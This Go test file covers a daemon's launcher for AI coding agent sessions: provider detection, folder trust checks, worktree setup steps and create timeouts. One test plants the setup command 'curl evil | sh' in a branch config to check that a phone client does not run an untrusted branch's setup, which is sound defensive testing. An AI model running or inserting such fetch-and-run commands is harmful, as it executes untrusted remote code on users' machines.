package launch

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"
	"time"

	"pocketd/internal/agent"
	"pocketd/internal/broker"
	"pocketd/internal/config/configtest"
	"pocketd/internal/daemon"
	"pocketd/internal/hub"
	"pocketd/internal/locals"
	"pocketd/internal/proto"
	"pocketd/internal/providers"
	"pocketd/internal/registry"
	"pocketd/internal/shellenv"
	"pocketd/internal/state"
	"pocketd/internal/statedb/dbtest"
	"pocketd/internal/terminal"
	"pocketd/internal/worktree"
)

// registryFrom is the registry the import into pocketd.db makes of home's desktop.json.
func registryFrom(t *testing.T, home string) *registry.Registry {
	t.Helper()
	db := dbtest.Open(t, filepath.Join(t.TempDir(), "pocketd.db"))
	s, err := registry.ReadLegacy(home)
	if err != nil {
		t.Fatal(err)
	}
	tx, err := db.Begin()
	if err != nil {
		t.Fatal(err)
	}
	if err := registry.Insert(tx, s); err != nil {
		t.Fatal(err)
	}
	if err := tx.Commit(); err != nil {
		t.Fatal(err)
	}
	r, err := registry.Open(db)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func launcher(t *testing.T, projects string) *Launcher {
	home := t.TempDir()
	path := filepath.Join(home, "desktop.json")
	os.WriteFile(path, []byte(`{"projects":`+projects+`,"repos":{}}`), 0o600)
	return New(&daemon.Daemon{}, registryFrom(t, filepath.Dir(path)), configtest.Settings(t), nil)
}

// openLocals is the Locals over a database that holds l's projects.
func openLocals(t *testing.T, l *Launcher) *locals.Locals {
	t.Helper()
	db := dbtest.Open(t, filepath.Join(t.TempDir(), "pocketd.db"))
	f := l.reg.Load()
	var s registry.State
	for _, p := range f.Projects {
		s.Projects = append(s.Projects, proto.RegistryProject{ID: f.Repos[p].ID, Path: p})
	}
	tx, err := db.Begin()
	if err != nil {
		t.Fatal(err)
	}
	if err := registry.Insert(tx, s); err != nil {
		t.Fatal(err)
	}
	if err := tx.Commit(); err != nil {
		t.Fatal(err)
	}
	ls, err := locals.Open(db, l.reg.Load)
	if err != nil {
		t.Fatal(err)
	}
	return ls
}

func quiet(step, note string) {}

// onPath has each of names on PATH be a command whose --help reads as fx's, pi's and omp's do.
func onPath(t *testing.T, names ...string) {
	dir := t.TempDir()
	for _, n := range names {
		program(t, filepath.Join(dir, n), "echo 'Usage: acp, --mode rpc'", "@echo Usage: acp, --mode rpc")
	}
	path := dir + ":/usr/bin:/bin"
	if runtime.GOOS == "windows" {
		// git for the repos tests make, and nothing that may hold a real agent.
		git, _ := exec.LookPath("git")
		path = strings.Join([]string{dir, filepath.Dir(git), filepath.Join(os.Getenv("SystemRoot"), "System32")}, string(os.PathListSeparator))
	}
	t.Setenv("PATH", path)
	t.Setenv("SHELL", "/bin/sh")
}

// program makes path run the sh script, or on Windows the batch file bat as path.cmd, and is the path it made.
func program(t *testing.T, path, sh, bat string) string {
	t.Helper()
	body := "#!/bin/sh\n" + sh + "\n"
	if runtime.GOOS == "windows" {
		path, body = path+".cmd", bat+"\r\n"
	}
	if err := os.WriteFile(path, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	return path
}

func sleeper() (string, []string) {
	if runtime.GOOS == "windows" {
		return shellenv.LoginShell(), []string{"-NoProfile", "-Command", "Start-Sleep 30"}
	}
	return "/bin/sh", []string{"-c", "sleep 30"}
}

func projectList(projects ...string) string {
	raw, _ := json.Marshal(projects)
	return string(raw)
}

// shellsWith is each shell on this Mac with a function cc that echoes its args, and a PATH holding a file cc.
func shellsWith(t *testing.T) map[string][]string {
	home, bin := t.TempDir(), t.TempDir()
	os.WriteFile(filepath.Join(bin, "cc"), []byte("#!/bin/sh\necho compiler\n"), 0o755)
	os.WriteFile(filepath.Join(bin, "real"), []byte("#!/bin/sh\n"), 0o755)
	os.WriteFile(filepath.Join(home, ".zshenv"), []byte("cc() { echo \"$@\"; cat; }\n"), 0o644)
	os.MkdirAll(filepath.Join(home, ".config", "fish", "functions"), 0o755)
	os.WriteFile(filepath.Join(home, ".config", "fish", "functions", "cc.fish"), []byte("function cc; echo $argv; cat; end\n"), 0o644)
	envs := map[string][]string{}
	for _, shell := range []string{"/bin/zsh", "fish"} {
		if path, err := exec.LookPath(shell); err == nil {
			envs[path] = []string{"HOME=" + home, "ZDOTDIR=" + home, "PATH=" + bin + ":/usr/bin:/bin", "SHELL=" + path}
		}
	}
	return envs
}

func TestAShellFunctionWinsOverTheFileOfTheSameNameAsInTheUsersTerminal(t *testing.T) {
	for shell, env := range shellsWith(t) {
		if got, err := resolve("cc", env); got != "cc" || err != nil {
			t.Errorf("%s: cc resolves to %q, %v", shell, got, err)
		}
		if got, _ := resolve("real", env); !strings.HasSuffix(got, "/real") {
			t.Errorf("%s: real resolves to %q", shell, got)
		}
		if _, err := resolve("missing", env); err == nil {
			t.Errorf("%s: a missing command was found", shell)
		}
	}
}

func TestNamingRunsAShellFunctionThroughTheShell(t *testing.T) {
	for shell, env := range shellsWith(t) {
		n, err := generate("claude", "cc", `{"title":"Fix login"}`, env)
		if err != nil || n.Title != "Fix login" {
			t.Errorf("%s: got %+v, %v", shell, n, err)
		}
	}
}

func TestProvidersShowWhatIsInstalled(t *testing.T) {
	onPath(t, "claude", "pi", "agy", "cursor")
	l := launcher(t, `[]`)
	list := l.Providers()
	var ids, available []string
	for _, p := range list {
		if ids = append(ids, p.ID); p.Available {
			available = append(available, p.ID)
		}
	}
	// A file named after an id isn't its command.
	if strings.Join(ids, " ") != "claude codex cursor grok opencode pi omp fx hermes antigravity" || strings.Join(available, " ") != "claude pi antigravity" {
		t.Fatalf("got %v, available %v", ids, available)
	}
	if !list[0].Available || list[1].Available || len(list[0].Efforts) != 5 || !list[0].Plan || list[1].Plan {
		t.Fatalf("got %+v", list)
	}
	if list[1].Efforts == nil || len(list[1].Efforts) != 0 || list[0].ID != "claude" || list[1].ID != "codex" {
		t.Fatalf("got %+v", list)
	}
	if list[0].Chat != (providers.Chat{Interrupt: true, Compact: true, SendWhileWorking: true, SubAgents: true, SendNow: true}) ||
		list[1].Chat != (providers.Chat{Interrupt: true, Compact: true, SendWhileWorking: true, SubAgents: false}) {
		t.Fatalf("chat %+v %+v", list[0].Chat, list[1].Chat)
	}
}

func TestAProviderStartsFromTheCommandConfigSetNamed(t *testing.T) {
	onPath(t, "claude")
	l := launcher(t, `[]`)
	dir := t.TempDir()
	custom, plain := program(t, filepath.Join(dir, "claude-dev"), "", ""), filepath.Join(dir, "notes")
	os.WriteFile(plain, []byte("x"), 0o644)
	if err := l.CheckCommand(plain); err == nil {
		t.Fatal("a file that isn't executable was accepted")
	}
	if err := l.CheckCommand(custom); err != nil {
		t.Fatal(err)
	}
	l.set.Set("claude.command", custom)
	l.set.Set("codex.command", plain)
	if paths := l.Paths(); paths["claude"] != custom || paths["codex"] != "" {
		t.Fatalf("got %v", paths)
	}
}

func TestCreateRefusesAnUnknownProjectOrAMissingProvider(t *testing.T) {
	onPath(t)
	project := t.TempDir()
	l := launcher(t, projectList(project))
	owner := Who{Owner: true, Key: "owner"}
	s := spec("claude", "ask", false)
	if r := l.Create(owner, "r1", s, quiet, nil); r.Err == nil || r.Err.Code != "unknown_project" {
		t.Fatalf("got %+v", r.Err)
	}
	s.Project = project
	if r := l.Create(owner, "r2", s, quiet, nil); r.Err == nil || r.Err.Code != "provider_unavailable" {
		t.Fatalf("got %+v", r.Err)
	}
}

func TestAnUntrustedClaudeFolderIsRefusedForThePhone(t *testing.T) {
	onPath(t, "claude")
	t.Setenv("CLAUDE_CONFIG_DIR", t.TempDir())
	t.Setenv("CLAUDE_CODE_SANDBOXED", "")
	project, _ := filepath.EvalSymlinks(t.TempDir())
	git(t, project, "init", "-q", "-b", "main")
	git(t, project, "commit", "-q", "--allow-empty", "-m", "init")
	l := launcher(t, projectList(project))
	s := spec("claude", "ask", false)
	s.Project, s.Checkout.Worktree = project, project
	r := l.Create(Who{Key: "device:d1"}, "r1", s, quiet, func(Creating) { t.Fatal("creating") })
	if r.Err == nil || r.Err.Code != "folder_not_trusted" || r.Err.Message != "Trust this folder in Claude on your Mac first" {
		t.Fatalf("got %+v", r.Err)
	}
	s.Checkout = proto.Checkout{New: &proto.NewWorktree{Name: "calm-otter"}}
	if r := l.Create(Who{Key: "device:d1"}, "r2", s, quiet, nil); r.Err == nil || r.Err.Code != "folder_not_trusted" {
		t.Fatalf("got %+v", r.Err)
	}
	if out, _ := exec.Command("git", "-C", project, "worktree", "list", "--porcelain").Output(); strings.Count(string(out), "worktree ") != 1 {
		t.Fatalf("a Worktree was made before the refusal:\n%s", out)
	}
}

func TestAnAgentExitFailsItsRestore(t *testing.T) {
	h := hub.New()
	d := &daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(h), Broker: broker.New(h), Home: t.TempDir(), Exe: "/bin/true",
		Registry: registryFrom(t, t.TempDir())}
	reasons := make(chan string, 1)
	sleep, args := sleeper()
	d.Resume = func(state.Terminal) (string, []string, string) { return sleep, args, "" }
	d.OnRestore = func(_ string, _ bool, _ int64, _, reason string) { reasons <- reason }
	d.Restore(state.File{Version: state.Version, Terminals: []state.Terminal{{TerminalID: "t-1", LaunchDir: t.TempDir(), Cols: 80, Rows: 24,
		Provider: "claude", ConversationID: "c1", Launch: &state.Launch{Access: "ask"}, AgentID: "a-1"}}}, "/bin/sh")
	t.Cleanup(d.Terminals.Get("t-1").Close)
	New(d, d.Registry, configtest.Settings(t), nil).Exited("t-1", "agent", 1)
	select {
	case r := <-reasons:
		if r != "agent_exited" {
			t.Fatalf("reason = %q", r)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("no restore report")
	}
}

func TestACreateWhoseAgentNeverShowsUpFailsAtItsDeadline(t *testing.T) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	onPath(t, "claude")
	t.Setenv("SHELL", "/bin/sh")
	project, _ := filepath.EvalSymlinks(t.TempDir())
	git(t, project, "init", "-q", "-b", "main")
	git(t, project, "commit", "-q", "--allow-empty", "-m", "init")
	l := launcher(t, projectList(project))
	l.d = &daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(hub.New()), Exe: "/bin/true"}
	owner := Who{Owner: true, Key: "owner"}
	s := spec("claude", "ask", false)
	s.Project, s.Checkout.Worktree = project, project
	results := make(chan Result, 1)
	go func() { results <- l.Create(owner, "r1", s, quiet, func(Creating) {}) }()
	var r Result
	select {
	case r = <-results:
	case <-time.After(5 * time.Second):
		t.Fatal("the create never ended")
	}
	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
		t.Cleanup(term.Close)
	}
	if r.Err == nil || r.Err.Code != "spawn_failed" {
		t.Fatalf("got %+v", r)
	}
}

func TestACreateWhoseTerminalDiesSaysWhatItShowed(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the agent is a /bin/sh script that kills its shell")
	}
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "claude"), []byte("#!/bin/sh\necho 'claude: the config is corrupt'\nsleep 0.2\nkill -9 $PPID\nsleep 5\n"), 0o755)
	t.Setenv("PATH", dir+":/usr/bin:/bin")
	t.Setenv("SHELL", "/bin/sh")
	project, _ := filepath.EvalSymlinks(t.TempDir())
	git(t, project, "init", "-q", "-b", "main")
	git(t, project, "commit", "-q", "--allow-empty", "-m", "init")
	l := launcher(t, projectList(project))
	l.d = &daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(hub.New()), Exe: "/bin/true"}
	s := spec("claude", "ask", false)
	s.Project, s.Checkout.Worktree = project, project
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, quiet, func(Creating) {})
	if r.Err == nil || r.Err.Code != "spawn_failed" || !strings.Contains(r.Err.Message, "killed") || !strings.Contains(r.Err.Detail, "the config is corrupt") {
		t.Fatalf("got %+v", r.Err)
	}
}

func TestACreateIsStartingUntilItEndsAndOnlyItsFirstWatcherHearsIt(t *testing.T) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = time.Second
	onPath(t, "claude")
	t.Setenv("SHELL", "/bin/sh")
	project, _ := filepath.EvalSymlinks(t.TempDir())
	git(t, project, "init", "-q", "-b", "main")
	git(t, project, "commit", "-q", "--allow-empty", "-m", "init")
	l := launcher(t, projectList(project))
	l.d = &daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(hub.New()), Exe: "/bin/true"}
	t.Cleanup(func() { l.d.Terminals.CloseAll(0) })
	s := spec("claude", "ask", false)
	s.Project, s.Checkout.Worktree = project, project
	var steps []string
	watched := make(chan Creating, 1)
	heard := make(chan Result, 1)
	stop := l.Watch("k1", func(step, _ string) { steps = append(steps, step) }, func(c Creating) { watched <- c }, func(r Result) { heard <- r })
	defer stop()
	defer l.Watch("k1", func(string, string) { t.Error("a second watcher got progress") }, func(Creating) { t.Error("a second watcher got the terminal") },
		func(Result) { t.Error("a second watcher got the outcome") })()
	if l.Starting() {
		t.Fatal("starting before any create")
	}
	first := make(chan Result, 1)
	go func() { first <- l.Create(Who{Owner: true, Key: "owner"}, "k1", s, quiet, func(Creating) {}) }()
	var c Creating
	select {
	case c = <-watched:
	case <-time.After(5 * time.Second):
		t.Fatal("the watcher heard of no terminal")
	}
	if !l.Starting() {
		t.Fatal("a running create isn't starting")
	}
	r := <-first
	if l.Starting() {
		t.Fatal("a finished create is still starting")
	}
	if r.Creating != c || len(steps) == 0 || steps[0] != proto.StepPrepare || <-heard != r {
		t.Fatalf("result %+v, watched %+v, steps %v", r, c, steps)
	}
}

func TestACreateInALocalRunsInTheProjectAndCarriesTheLocal(t *testing.T) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	onPath(t, "claude")
	t.Setenv("SHELL", "/bin/sh")
	project, _ := filepath.EvalSymlinks(t.TempDir())
	git(t, project, "init", "-q", "-b", "main")
	l := launcher(t, projectList(project))
	l.d = &daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(hub.New()), Exe: "/bin/true"}
	t.Cleanup(func() { l.d.Terminals.CloseAll(0) })
	l.Locals = openLocals(t, l)
	l.Locals.Create("l1", project, "Local 2")
	s := spec("claude", "ask", false)
	s.Project, s.Checkout = project, proto.Checkout{Local: "l1"}
	var got Creating
	var local string
	l.Create(Who{Owner: true, Key: "owner"}, "r1", s, quiet, func(c Creating) {
		got, local = c, l.d.Terminals.Get(c.Terminal).Info().Local
	})
	if got.Cwd != project || got.Setup || local != "l1" {
		t.Fatalf("creating %+v in local %q", got, local)
	}
}

func TestACreateInADeletedOrForeignLocalFails(t *testing.T) {
	onPath(t, "claude")
	l := launcher(t, `["/p","/q"]`)
	l.Locals = openLocals(t, l)
	l.Locals.Create("l1", "/q", "Local 2")
	for _, id := range []string{"gone", "l1"} {
		s := spec("claude", "ask", false)
		s.Project, s.Checkout = "/p", proto.Checkout{Local: id}
		r := l.Create(Who{Owner: true, Key: "owner"}, "r-"+id, s, quiet, func(Creating) {})
		if r.Err == nil || r.Err.Code != "unknown_local" || r.Err.Message != "This Local was deleted" {
			t.Fatalf("%s: %+v", id, r.Err)
		}
	}
}

func newWorktree(t *testing.T, setup string) (*Launcher, proto.LaunchSpec) {
	onPath(t, "claude")
	root, _ := filepath.EvalSymlinks(t.TempDir())
	project := filepath.Join(root, "repo")
	os.Mkdir(project, 0o755)
	git(t, project, "init", "-q", "-b", "main")
	git(t, project, "commit", "-q", "--allow-empty", "-m", "init")
	path := filepath.Join(root, "desktop.json")
	q := func(s string) string { raw, _ := json.Marshal(s); return string(raw) }
	os.WriteFile(path, []byte(`{"projects":[`+q(project)+`],"repos":{`+q(project)+`:{"name":"wt","setup":`+q(setup)+`}},"worktree":{"root":`+q(root)+`}}`), 0o600)
	l := New(&daemon.Daemon{Terminals: terminal.NewManager(), Agents: agent.NewRegistry(hub.New()), Exe: "/bin/true"}, registryFrom(t, filepath.Dir(path)), configtest.Settings(t), nil)
	s := spec("claude", "ask", false)
	s.Project, s.Checkout = project, proto.Checkout{New: &proto.NewWorktree{Name: "calm-otter"}}
	return l, s
}

func TestANewWorktreeRunsTheRepoSetupUnlessTheProjectSettingsNameOne(t *testing.T) {
	tree := t.TempDir()
	os.Mkdir(filepath.Join(tree, worktree.ConfigDir), 0o755)
	os.WriteFile(worktree.ConfigPath(tree, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
	off := false
	quiet := func(string, string) {}
	for _, c := range []struct {
		name, settings string
		setup          *bool
		want           string
	}{
		{"repo", "", nil, "make deps"},
		{"settings", "make all", nil, "make all"},
		{"turned off", "", &off, ""},
	} {
		f := registry.File{Repos: map[string]registry.Repo{"/p": {Setup: c.settings}}}
		s := proto.LaunchSpec{Project: "/p", Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w", Setup: c.setup, Copy: &off}}}
		if _, got, _ := (&Launcher{}).filled(Who{Owner: true}, f, s, tree, quiet); got != c.want {
			t.Errorf("%s: setup %q, want %q", c.name, got, c.want)
		}
	}
}

func TestAPhonesNewWorktreeRunsOnlyTheSetupInTheProjectsOwnCheckout(t *testing.T) {
	project, tree := t.TempDir(), t.TempDir()
	for _, dir := range []string{project, tree} {
		os.Mkdir(filepath.Join(dir, worktree.ConfigDir), 0o755)
	}
	os.WriteFile(worktree.ConfigPath(tree, worktree.ConfigFile), []byte(`{"setup": ["curl evil | sh"]}`), 0o644)
	f := registry.File{Repos: map[string]registry.Repo{}}
	s := proto.LaunchSpec{Project: project, Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w"}}}
	quiet := func(string, string) {}
	phone := Who{Key: "device:d1"}
	if _, got, _ := (&Launcher{}).filled(phone, f, s, tree, quiet); got != "" {
		t.Errorf("a branch's own setup ran for a phone: %q", got)
	}
	os.WriteFile(worktree.ConfigPath(project, worktree.ConfigFile), []byte(`{"setup": ["make deps"]}`), 0o644)
	if _, got, _ := (&Launcher{}).filled(phone, f, s, tree, quiet); got != "make deps" {
		t.Errorf("setup %q, want the checkout's", got)
	}
	if _, got, _ := (&Launcher{}).filled(Who{Owner: true}, f, s, tree, quiet); got != "curl evil | sh" {
		t.Errorf("the owner's setup %q, want the tree's", got)
	}
}

func TestANewWorktreeReportsEachStepAsItStarts(t *testing.T) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	t.Setenv("SHELL", "/bin/sh")
	l, s := newWorktree(t, "true")
	var steps []string
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(step, note string) {
		steps = append(steps, strings.TrimSpace(step+" "+note))
	}, func(c Creating) { go l.Exited(c.Terminal, "setup", 0) })
	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
		t.Cleanup(term.Close)
	}
	want := []string{"prepare", "verify", "fetch", "fetch No remote, using local main", "worktree", "copy", "setup", "agent"}
	if !slices.Equal(steps, want) {
		t.Fatalf("steps %q, want %q", steps, want)
	}
	if r.Err == nil || r.Err.Code != "spawn_failed" || r.Err.Message != "The session didn't start in 500ms" {
		t.Fatalf("a passing setup ended the create: %+v", r.Err)
	}
}

func TestASessionsTerminalNamesItsProjectAndWorktreeForTheSetup(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the setup is POSIX shell")
	}
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	l, s := newWorktree(t, "env | grep -E '^(ANYWHERE|ZOES)_(ROOT|WORKSPACE)_' | sort > ../env")
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(string, string) {}, func(c Creating) { go l.Exited(c.Terminal, "setup", 0) })
	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
		t.Cleanup(term.Close)
	}
	want := "ANYWHERE_ROOT_PATH=" + s.Project + "\nANYWHERE_WORKSPACE_NAME=" + filepath.Base(r.Cwd) + "\nANYWHERE_WORKSPACE_PATH=" + r.Cwd + "\n" +
		"ZOES_ROOT_PATH=" + s.Project + "\nZOES_WORKSPACE_NAME=" + filepath.Base(r.Cwd) + "\nZOES_WORKSPACE_PATH=" + r.Cwd + "\n"
	var got []byte
	for end := time.Now().Add(5 * time.Second); time.Now().Before(end); time.Sleep(20 * time.Millisecond) {
		if got, _ = os.ReadFile(filepath.Join(filepath.Dir(r.Cwd), "env")); string(got) == want {
			return
		}
	}
	t.Fatalf("setup saw %q, want %q", got, want)
}

func TestATerminalThatCantStartFailsTheStepAfterTheWorktree(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Windows terminals run PowerShell whatever $SHELL says")
	}
	l, s := newWorktree(t, "")
	claude, _ := exec.LookPath("claude")
	l.set.Set("claude.command", claude)
	notAProgram := filepath.Join(t.TempDir(), "shell")
	if err := os.WriteFile(notAProgram, []byte("not a program"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("SHELL", notAProgram)
	var steps []string
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(step, note string) { steps = append(steps, step) }, func(Creating) {})
	if r.Err == nil || r.Err.Message != "Couldn't start a terminal" {
		t.Fatalf("got %+v", r.Err)
	}
	if last := steps[len(steps)-1]; last != proto.StepAgent {
		t.Fatalf("steps %q", steps)
	}
}

// opening runs a create for branch in a newWorktree project and gives its
// steps and the folder its terminal started in.
func opening(t *testing.T, branch string) (steps []string, cwd string) {
	defer func(w time.Duration) { createWait = w }(createWait)
	createWait = 500 * time.Millisecond
	t.Setenv("SHELL", "/bin/sh")
	l, s := newWorktree(t, "true")
	git(t, s.Project, "branch", "feat")
	s.Checkout.New = &proto.NewWorktree{Branch: branch}
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(step, note string) {
		steps = append(steps, strings.TrimSpace(step+" "+note))
	}, func(c Creating) {
		if cwd = c.Cwd; c.Setup {
			go l.Exited(c.Terminal, "setup", 0)
		}
	})
	if term := l.d.Terminals.Get(r.TerminalID); term != nil {
		t.Cleanup(term.Close)
	}
	return steps, cwd
}

func TestABranchOpensInItsOwnWorktreeWithCopyAndSetup(t *testing.T) {
	steps, cwd := opening(t, "feat")
	want := []string{"prepare", "verify", "fetch", "worktree", "copy", "setup", "agent"}
	if !slices.Equal(steps, want) || filepath.Base(cwd) != "feat" || filepath.Base(filepath.Dir(cwd)) != "wt" {
		t.Fatalf("steps %q in %s", steps, cwd)
	}
}

func TestABranchAlreadyCheckedOutIsUsedWithoutCopyOrSetup(t *testing.T) {
	steps, cwd := opening(t, "main")
	want := []string{"prepare", "verify", "fetch", "worktree", "worktree Already open in repo", "agent"}
	if !slices.Equal(steps, want) || filepath.Base(cwd) != "repo" {
		t.Fatalf("steps %q in %s", steps, cwd)
	}
}

func TestAPRWithoutGhAsksToInstallIt(t *testing.T) {
	l, s := newWorktree(t, "")
	s.Checkout.New = &proto.NewWorktree{PR: "7"}
	r := l.Create(Who{Owner: true, Key: "owner"}, "r1", s, func(string, string) {}, func(Creating) {})
	if r.Err == nil || r.Err.Code != "spawn_failed" || r.Err.Message != "Install GitHub CLI (gh) to open pull requests" {
		t.Fatalf("got %+v", r.Err)
	}
}

func TestASessionsShellThatIsntInstalledFallsBackToTheLoginShell(t *testing.T) {
	if got := shellOf([]string{"SHELL=/no/such/fish"}); got != shellenv.LoginShell() {
		t.Fatal(got)
	}
	if got := shellOf([]string{"SHELL=/bin/sh"}); runtime.GOOS != "windows" && got != "/bin/sh" {
		t.Fatal(got)
	}
}

func TestTwoCreatesHoldingTheSamePlaceholderGetNamesOfTheirOwnUntilOneIsMade(t *testing.T) {
	project := t.TempDir()
	if out, err := exec.Command("git", "-C", project, "init", "-q", "-b", "main").CombinedOutput(); err != nil {
		t.Fatalf("%v: %s", err, out)
	}
	f := registry.File{Projects: []string{project}, Worktree: registry.Worktree{Root: t.TempDir()}}
	l := &Launcher{}
	first, second := &proto.NewWorktree{Name: "notes"}, &proto.NewWorktree{Name: "notes"}
	release, err := l.hold(f, project, first)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := l.hold(f, project, second); err != nil {
		t.Fatal(err)
	}
	if first.Name != "notes" || second.Name != "notes-2" {
		t.Fatalf("held %q and %q", first.Name, second.Name)
	}
	release()
	third := &proto.NewWorktree{Name: "notes"}
	if _, err := l.hold(f, project, third); err != nil || third.Name != "notes" {
		t.Fatalf("after the first let go: %q, %v", third.Name, err)
	}
}

func TestANewWorktreeTheOwnerMakesForAnAgentIsRecordedAsTheAgents(t *testing.T) {
	reg := registryFrom(t, t.TempDir())
	l := &Launcher{reg: reg}
	off := false
	quiet := func(string, string) {}
	spec := func(forAgent bool) proto.LaunchSpec {
		return proto.LaunchSpec{Project: "/p", Checkout: proto.Checkout{New: &proto.NewWorktree{Name: "w", Setup: &off, Copy: &off, ForAgent: forAgent}}}
	}
	l.filled(Who{Owner: true}, registry.File{}, spec(false), "/wt/person", quiet)
	l.filled(Who{Key: "device:d"}, registry.File{}, spec(true), "/wt/phone", quiet)
	l.filled(Who{Owner: true}, registry.File{}, spec(true), "/wt/agent", quiet)
	if got := reg.Load().AgentWorktrees; !slices.Equal(got, []string{"/wt/agent"}) {
		t.Fatalf("agent worktrees %v", got)
	}
	l.filled(Who{Owner: true}, reg.Load(), spec(false), "/wt/agent", quiet)
	if got := reg.Load().AgentWorktrees; len(got) != 0 {
		t.Fatalf("a person's new worktree where an agent's was is still the agent's: %v", got)
	}
}
